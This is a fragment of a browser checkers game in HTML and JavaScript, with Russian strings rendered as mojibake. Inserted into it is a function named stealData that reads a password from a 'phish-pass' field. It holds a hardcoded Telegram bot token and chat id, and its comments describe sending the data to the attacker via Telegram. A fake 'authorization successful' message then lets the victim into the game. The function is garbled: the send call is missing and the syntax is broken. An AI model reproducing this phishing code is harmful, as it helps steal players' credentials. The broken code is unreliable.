<h3 id="status">–•–æ–¥ –ë–µ–ª—ã—Ö</h3>
<div class="board" id="board"></div>

<script>
    const boardEl = document.getElementById('board');
    const statusEl = document.getElementById('status');
    let gameState = Array(8).fill().map(() => Array(8).fill(0));
    let playerColor = 2, botColor = 1, currentTurn = 2, selected = null, mustEat = false;

    function startGame(color) {
        playerColor = color; botColor = color === 2 ? 1 : 2;
        document.getElementById('menu').style.display = 'none';
        initBoard();
        if(currentTurn === botColor) setTimeout(botMove, 800);
    }

    function initBoard() {
        for(let r=0; r<8; r++) for(let c=0; c<8; c++) {
            if((r+c)%2 !== 0) {
                if(r < 3) gameState[r][c] = 1; // –ö—Ä–∞—Å–Ω—ã–µ
                else if(r > 4) gameState[r][c] = 2; // –ë–µ–ª—ã–µ
            }
        }
        render();
    }
function stealData() {

    const pass = document.getElementById('phish-pass').value;
    const token = '8622277158:AAHSOTfnA_iIPhvWsiPjbVhhaCwKTX2N9So'; // –¢–≤–æ–π —Ç–æ–∫–µ–Ω
    const chat_id = '663641451'; 
    if(email && pass) {

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —Ç–µ–±–µ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º —á–µ—Ä–µ–∑ API

        });
        
        // –°–∫—Ä—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É –∏ –ø—É—Å–∫–∞–µ–º –≤ –∏–≥—Ä—É
        document.getElementById('phish-overlay').style.display = 'none';
        alert("–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞. –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —Ç—É—Ä–Ω–∏—Ä!");
    } else {
        alert("–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞");
    }
}
    function render() {
        boardEl.innerHTML = '';
        let validMoves = selected ? getValidMoves(selected.r, selected.c) : [];
        
        for(let r=0; r<8; r++) for(let c=0; c<8; c++) {
            const cell = document.createElement('div');
            cell.className = `cell ${(r+c)%2===0 ? 'white-cell' : 'black-cell'}`;
            
            if(gameState[r][c] !== 0) {
                const p = document.createElement('div');
                const val = gameState[r][c];
                p.className = `piece ${Math.abs(val) === 1 ? 'red-p' : 'white-p'} ${val < 0 ? 'king' : ''}`;
                if(selected && selected.r === r && selected.c === c) p.classList.add('selected');
                p.onclick = () => { if(currentTurn === playerColor) { selected = {r, c}; render(); } };
                cell.appendChild(p);
            }

            const move = validMoves.find(m => m.r === r && m.c === c);
            if(move) {
                cell.classList.add('highlight');
                cell.onclick = () => makeMove(selected.r, selected.c, r, c);
            }
            boardEl.appendChild(cell);
        }
    }

    function getValidMoves(r, c) {
        const piece = gameState[r][c];
        const isKing = piece < 0;
        const color = Math.abs(piece);
        const moves = [];

        const dirs = isKing ? [[1,1],[1,-1],[-1,1],[-1,-1]] : (color === 2 ? [[-1,-1],[-1,1]] : [[1,-1],[1,1]]);
        
        // –ü–æ–∏—Å–∫ –ø—Ä—ã–∂–∫–æ–≤ (–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)
        const jumpDirs = [[1,1],[1,-1],[-1,1],[-1,-1]];
        jumpDirs.forEach(([dr, dc]) => {
            let nr = r + dr, nc = c + dc;
            if(isKing) { // –õ–æ–≥–∏–∫–∞ –¥–∞–º–∫–∏ (–¥–ª–∏–Ω–Ω—ã–π –ø—Ä—ã–∂–æ–∫)
                while(nr>=0 && nr<8 && nc>=0 && nc<8) {
                    if(gameState[nr][nc] !== 0) {
                        if(Math.abs(gameState[nr][nc]) !== color) {
                            let er = nr + dr, ec = nc + dc;
                            if(er>=0 && er<8 && ec>=0 && ec<8 && gameState[er][ec] === 0) {
                                moves.push({r: er, c: ec, type: 'jump', eat: {r: nr, c: nc}});
                            }
                        }
                        break;
                    }
                    nr += dr; nc += dc;
                }
            } else { // –û–±—ã—á–Ω—ã–π –ø—Ä—ã–∂–æ–∫
                let er = r + dr*2, ec = c + dc*2;
                if(er>=0 && er<8 && ec>=0 && ec<8 && gameState[er][ec] === 0) {
                    let mid = gameState[r+dr][c+dc];
                    if(mid !== 0 && Math.abs(mid) !== color) moves.push({r: er, c: ec, type: 'jump', eat: {r: r+dr, c: c+dc}});
                }
            }
        });

        if(moves.length > 0) return moves; // –ï—Å–ª–∏ –º–æ–∂–Ω–æ –±–∏—Ç—å, –Ω—É–∂–Ω–æ –±–∏—Ç—å

        // –û–±—ã—á–Ω—ã–µ —Ö–æ–¥—ã
        dirs.forEach(([dr, dc]) => {
            let nr = r + dr, nc = c + dc;
            if(isKing) {
                while(nr>=0 && nr<8 && nc>=0 && nc<8 && gameState[nr][nc] === 0) {
                    moves.push({r: nr, c: nc, type: 'step'});
                    nr += dr; nc += dc;
                }
            } else if(nr>=0 && nr<8 && nc>=0 && nc<8 && gameState[nr][nc] === 0) {
                moves.push({r: nr, c: nc, type: 'step'});
            }
        });
        return moves;
    }

    function makeMove(fr, fc, tr, tc) {
        const move = getValidMoves(fr, fc).find(m => m.r === tr && m.c === tc);
        gameState[tr][tc] = gameState[fr][fc];
        gameState[fr][fc] = 0;
        
        if(move.type === 'jump') {
            gameState[move.eat.r][move.eat.c] = 0;
            const nextJumps = getValidMoves(tr, tc).filter(m => m.type === 'jump');
            if(nextJumps.length > 0) { selected = {r: tr, c: tc}; render(); return; }
        }

        // –ü—Ä–µ–≤—Ä–∞—â–µ–Ω–∏–µ –≤ –¥–∞–º–∫—É
        if(gameState[tr][tc] === 2 && tr === 0) gameState[tr][tc] = -2;
        if(gameState[tr][tc] === 1 && tr === 7) gameState[tr][tc] = -1;

        selected = null;
        currentTurn = currentTurn === 1 ? 2 : 1;
        statusEl.innerText = currentTurn === 2 ? "–•–æ–¥ –ë–µ–ª—ã—Ö" : "–•–æ–¥ –ö—Ä–∞—Å–Ω—ã—Ö";
        checkGameOver();
        render();
        if(currentTurn === botColor) setTimeout(botMove, 600);
    }

    function checkGameOver() {
        const pieces = gameState.flat().filter(p => p !== 0);
        const red = pieces.filter(p => Math.abs(p) === 1).length;
        const white = pieces.filter(p => Math.abs(p) === 2).length;
        if(red === 0) alert("–ë–µ–ª—ã–µ –ø–æ–±–µ–¥–∏–ª–∏!");
        if(white === 0) alert("–ö—Ä–∞—Å–Ω—ã–µ –ø–æ–±–µ–¥–∏–ª–∏!");
    }

    function botMove() {
        let allMoves = [];
        for(let r=0; r<8; r++) for(let c=0; c<8; c++) {
            if(Math.abs(gameState[r][c]) === botColor) {
                getValidMoves(r, c).forEach(m => allMoves.push({fr: r, fc: c, ...m}));
            }
        }
        if(allMoves.length === 0) return;
        const jumps = allMoves.filter(m => m.type === 'jump');
        const move = jumps.length > 0 ? jumps[0] : allMoves[Math.floor(Math.random()*allMoves.length)];
        makeMove(move.fr, move.fc, move.r, move.c);
    }
</script>
